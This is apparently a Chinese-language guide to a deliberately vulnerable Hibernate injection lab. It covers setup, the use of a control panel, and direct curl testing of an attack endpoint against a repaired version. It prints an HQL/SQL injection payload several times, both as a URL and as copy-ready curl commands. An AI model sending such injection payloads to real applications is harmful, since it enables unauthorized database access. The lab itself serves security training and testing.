# Hibernate 操作教程

- 类型：单体靶场
- 目录：`Hibernate`
- 端口：`9988`
- 推荐入口：`/Hibernate_injection?username=foobar' OR (SELECT COUNT(*) FROM User)>=0 OR 'foobar'='`

## 这是什么

Hibernate 注入靶场

## 启动前准备

1. 在仓库根目录执行 `bash run-local-build.sh`。
2. 等待对应容器启动完成，并确认端口 `9988` 已经监听。
3. 如果你还想通过首页统一发包，再额外确认 `http://宿主机IP:5000/` 能打开。

## 方式一：通过首页测试

1. 打开 `http://宿主机IP:5000/`。
2. 在搜索框输入 `hibernate、sql_injection_Hibernate_attack、sql_injection_Hibernate_repair` 过滤到当前项目。
3. 先点“测试”发送内置模板。
4. 推荐先跑 `sql_injection_Hibernate_attack`，再按需用“重放数据包”替换 payload。
5. 再跑 `sql_injection_Hibernate_repair` 做正常流量或修复版对照。

推荐直接使用的首页条目：
- `sql_injection_Hibernate_attack`：GET http://宿主机IP:9988/Hibernate_injection?username=foobar' OR (SELECT COUNT(*) FROM User)>=0 OR 'foobar'='
- `sql_injection_Hibernate_repair`：GET http://宿主机IP:9988/Hibernate_injection_repair?username=foobar' OR (SELECT COUNT(*) FROM User)>=0 OR 'foobar'='

## 方式二：直接访问接口测试

1. 先访问推荐入口：`http://宿主机IP:9988/Hibernate_injection?username=foobar' OR (SELECT COUNT(*) FROM User)>=0 OR 'foobar'='`。
2. 先执行攻击面请求：`sql_injection_Hibernate_attack`。
3. 可直接复制命令：`curl "http://宿主机IP:9988/Hibernate_injection?username=foobar' OR (SELECT COUNT(*) FROM User)>=0 OR 'foobar'='" -H "Content-Type: application/json"`。
4. 再执行对照请求：`sql_injection_Hibernate_repair`。
5. 对照命令：`curl "http://宿主机IP:9988/Hibernate_injection_repair?username=foobar' OR (SELECT COUNT(*) FROM User)>=0 OR 'foobar'='" -H "Content-Type: application/json"`。

## 测试时重点看什么

1. 先发正常请求确认业务可用，再发攻击请求对比响应差异。
2. 对于 SQLi、XXE、SSRF、SSTI、文件读写等接口，建议关注回显和异常日志。
3. 如果项目同时有 repair 版，再用同一组 payload 做一次对照验证。

## 相关入口

- 总控台：`http://宿主机IP:5000/`
- 文档索引：[`doc/README.md`](../README.md)
- 根项目说明：[`README.md`](../../README.md)
